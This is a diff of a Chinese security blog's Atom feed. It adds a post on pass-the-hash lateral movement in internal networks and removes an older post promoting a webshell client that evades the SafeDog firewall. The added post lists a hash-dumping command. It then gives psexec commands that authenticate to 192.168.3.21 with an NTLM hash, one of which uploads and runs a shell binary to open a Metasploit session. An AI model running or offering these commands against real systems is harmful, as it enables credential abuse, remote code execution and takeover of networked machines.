@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hamal.cc/"/>
-  <updated>2018-10-05T05:44:16.929Z</updated>
+  <updated>2018-10-14T11:24:38.168Z</updated>
   <id>http://hamal.cc/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>内网渗透横向移动hash传递注入</title>
+    <link href="http://hamal.cc/2018/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8hash%E4%BC%A0%E9%80%92%E6%B3%A8%E5%85%A5/"/>
+    <id>http://hamal.cc/2018/10/内网渗透横向移动hash传递注入/</id>
+    <published>2018-10-14T11:02:17.000Z</published>
+    <updated>2018-10-14T11:24:38.168Z</updated>
+    
+    <content type="html"><![CDATA[<p>在内网渗透中有时候抓不到明文密码，也可以用hash传递注入攻击拿下另一个目标<strong><a id="more"></a></strong></p><h3 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h3><p>工具地址：<br>获取hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q.exe -dhl</span><br></pre></td></tr></table></figure></p><p><img src="/images/21.1.jpg" alt=""></p><h3 id="hash传递注入"><a href="#hash传递注入" class="headerlink" title="hash传递注入"></a>hash传递注入</h3><p>先执行whoami命令看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe Administrator@192.168.3.21 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:880FDF4355DBB26715EA2DF2C408664E</span><br></pre></td></tr></table></figure></p><p><img src="/images/21.2.png" alt=""><br>看到执行成功的。配合msf使用，开始hash传递注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe Administrator@192.168.3.21 -c d:\windows.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:880FDF4355DBB26715EA2DF2C408664E</span><br></pre></td></tr></table></figure></p><p>说明：<code>d:\windows.exe</code>是本地shell的物理地址，我放到d盘目录下。<br><img src="/images/21.3.jpg" alt=""><br>msf成功获取到shell<br><img src="/images/21.4.jpg" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>又学到一个内网渗透技能…</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在内网渗透中有时候抓不到明文密码，也可以用hash传递注入攻击拿下另一个目标&lt;strong&gt;
+    
+    </summary>
+    
+      <category term="内网渗透" scheme="http://hamal.cc/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="内网渗透" scheme="http://hamal.cc/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>内网渗透IPC$弹shell</title>
@@ -435,28 +457,6 @@
     
     
       <category term="网络代理" scheme="http://hamal.cc/tags/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网页过狗一句话客户端</title>
-    <link href="http://hamal.cc/2018/02/%E7%BD%91%E9%A1%B5%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
-    <id>http://hamal.cc/2018/02/网页过狗一句话客户端/</id>
-    <published>2018-02-28T13:27:42.000Z</published>
-    <updated>2018-03-04T14:17:47.268Z</updated>
-    
-    <content type="html"><![CDATA[<p>在很多网站都有安全狗，用菜刀连接总是失败。。<br><a id="more"></a><br><img src="/images/2、1.png" alt=""><br>用网页一句话客户端绕过安全狗拦截。下载地址：<a href="https://github.com/alone5xiao/hamal.cc" target="_blank" rel="noopener">https://github.com/alone5xiao/hamal.cc</a><br><img src="/images/2、2.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;在很多网站都有安全狗，用菜刀连接总是失败。。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="一句话木马" scheme="http://hamal.cc/categories/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
-    
-    
-      <category term="一句话木马" scheme="http://hamal.cc/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
     
   </entry>
   
